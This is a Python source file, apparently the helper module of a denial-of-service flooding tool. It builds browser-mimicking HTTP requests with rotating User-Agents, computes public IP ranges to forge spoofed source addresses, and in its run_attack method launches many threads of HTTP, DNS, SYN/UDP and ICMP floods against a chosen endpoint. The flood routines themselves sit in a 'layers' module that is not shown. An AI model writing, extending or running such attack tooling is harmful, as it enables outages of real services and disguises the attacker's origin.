from random import choice, randrange
from ssl import SSLContext, CERT_REQUIRED, PROTOCOL_TLS_CLIENT
from threading import Thread
from urllib.parse import urlparse
from typing import Optional, Callable, List, Tuple

#  Endpoint Class 
class Endpoint:
    def __init__(self, host: str, port: int = 80, scheme: str = "http", path: str = "/"):
        self.host = host
        self.port = port
        self.scheme = scheme
        self.path = path

#  Parse URL into Endpoint 
def parse_url(url: str) -> Optional[Endpoint]:
    if "://" not in url:
        url = "http://" + url

    parsed = urlparse(url)
    if not parsed.scheme or not parsed.hostname:
        return None

    port = parsed.port or (443 if parsed.scheme.lower() == "https" else 80)
    path = parsed.path if parsed.path else "/"
    if parsed.query:
        path += "?" + parsed.query

    return Endpoint(host=parsed.hostname, port=port, scheme=parsed.scheme, path=path)

#  Network Tools 
class NetTools:
    def __init__(self):
        # Some common User-Agent strings
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/114.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15 Version/16.3",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5) Safari/604.1 Version/16.0",
            "Mozilla/5.0 (Linux; Android 13; SM-G991B) Chrome/114.0 Mobile Safari/537.36",
        ]

        # Reserved IP ranges (private, local, special)
        self._reserved_ranges: List[Tuple[int, int]] = [
            self._ip_to_int("10.0.0.0"), self._ip_to_int("10.255.255.255"),
            self._ip_to_int("127.0.0.0"), self._ip_to_int("127.255.255.255"),
            self._ip_to_int("172.16.0.0"), self._ip_to_int("172.31.255.255"),
            self._ip_to_int("192.168.0.0"), self._ip_to_int("192.168.255.255"),
            self._ip_to_int("169.254.0.0"), self._ip_to_int("169.254.255.255"),
            self._ip_to_int("100.64.0.0"), self._ip_to_int("100.127.255.255"),
            self._ip_to_int("198.18.0.0"), self._ip_to_int("198.19.255.255"),
            self._ip_to_int("224.0.0.0"), self._ip_to_int("239.255.255.255"),
            self._ip_to_int("240.0.0.0"), self._ip_to_int("255.255.255.254"),
        ]
        it = iter(self._reserved_ranges)
        self._reserved_ranges = [(s, e) for s, e in zip(it, it)]

        # Precompute allowed IP ranges for spoofing
        self._allowed_spoof_ranges = self._compute_allowed_spoof_ranges()

    #  Random User-Agent 
    def random_user_agent(self) -> str:
        return choice(self.user_agents)

    #  Build HTTP request headers 
    def base_headers(self, method: str, endpoint: Endpoint) -> str:
        return (
            f"{method.upper()} {endpoint.path} HTTP/{choice(['1.0', '1.1'])}\r\n"
            "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Cache-Control: max-age=0\r\n"
            "Connection: keep-alive\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
            "Sec-Fetch-User: ?1\r\n"
            "Sec-Gpc: 1\r\n"
            "Pragma: no-cache\r\n"
            "Upgrade-Insecure-Requests: 1\r\n"
        )

    #  Build full HTTP request 
    def build_request(self, endpoint: Endpoint, method: str = "GET", body: str = "") -> bytes:
        method = method.upper()
        body_bytes = body.encode("utf-8") if isinstance(body, str) else body

        headers = self.base_headers(method, endpoint)
        if not headers.endswith("\r\n"):
            headers += "\r\n"

        # Host header
        host = endpoint.host.replace("\r", "").replace("\n", "")
        port = getattr(endpoint, "port", None)
        headers += f"Host: {host}:{port}\r\n" if port and port not in (80, 443) else f"Host: {host}\r\n"

        # User-Agent header
        ua = self.random_user_agent().replace("\r", "").replace("\n", "")
        headers += f"User-Agent: {ua}\r\n"

        # Content headers for POST/PUT/PATCH or if body exists
        if method in ("POST", "PUT", "PATCH") or body_bytes:
            headers += f"Content-Length: {len(body_bytes)}\r\n"
            if "Content-Type:" not in headers:
                headers += "Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n"

        return (headers + "\r\n").encode("utf-8") + body_bytes

    #  IP utilities 
    def _ip_to_int(self, ip_str: str) -> int:
        parts = list(map(int, ip_str.split(".")))
        return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]

    def is_reserved_ip(self, ip_str: str) -> bool:
        try:
            parts = list(map(int, ip_str.split(".")))
            if len(parts) != 4:
                return True
            ip_int = self._ip_to_int(ip_str)
        except Exception:
            return True
        return any(start <= ip_int <= end for start, end in self._reserved_ranges)

    #  Compute allowed spoof IP ranges 
    def _compute_allowed_spoof_ranges(self) -> List[Tuple[int, int]]:
        allowed = []
        base_start = self._ip_to_int("1.0.0.0")
        base_end = self._ip_to_int("223.255.255.255")

        current_ranges = [(base_start, base_end)]
        for rstart, rend in self._reserved_ranges:
            new_ranges = []
            for a, b in current_ranges:
                if rend < a or rstart > b:
                    new_ranges.append((a, b))
                    continue
                if rstart > a:
                    new_ranges.append((a, rstart - 1))
                if rend < b:
                    new_ranges.append((rend + 1, b))
            current_ranges = new_ranges
        return [rng for rng in current_ranges if rng[0] <= rng[1]]

    #  Generate random spoofed IP 
    def generate_spoofed_ip(self) -> str:
        ranges = self._allowed_spoof_ranges
        if not ranges:
            raise RuntimeError("No allowed IP ranges available for spoofing.")

        total = sum((end - start + 1) for start, end in ranges)
        pick = randrange(total)
        acc = 0
        for start, end in ranges:
            size = end - start + 1
            if pick < acc + size:
                val = start + (pick - acc)
                a, b, c, d = (val >> 24 & 0xFF, val >> 16 & 0xFF, val >> 8 & 0xFF, val & 0xFF)
                return f"{a}.{b}.{c}.{d}"
            acc += size

        # Fallback to last IP
        last = ranges[-1][1]
        a, b, c, d = (last >> 24 & 0xFF, last >> 16 & 0xFF, last >> 8 & 0xFF, last & 0xFF)
        return f"{a}.{b}.{c}.{d}"

    #  Run multiple threads 
    def run_threads(self, func, args=(), count: int = 1):
        for _ in range(count):
            t = Thread(target=func, args=args, daemon=True)
            t.start()

    #  Run attack 
    def run_attack(self, endpoint: Endpoint, duration: int, method: str, threads: int):
        from .layers import L7, L4, L3

        def get_function(method: str) -> Callable:
            method = method.upper()
            if method in {"GET", "POST", "PUT", "DELETE", "HEAD", "DNS"}:
                l7 = L7(endpoint, duration=duration)
                return getattr(l7, method)
            elif method in {"ACK", "SYN", "FIN", "RST", "TCP", "UDP"}:
                l4 = L4(endpoint, duration=duration)
                return getattr(l4, method)
            elif method == "ICMP":
                l3 = L3(endpoint, duration=duration)
                return getattr(l3, method)
            else:
                raise ValueError(f"Unsupported attack method: {method}")

        func = get_function(method)
        args = () if method != "DNS" else (self.generate_spoofed_ip(),)
        self.run_threads(func, args, threads)
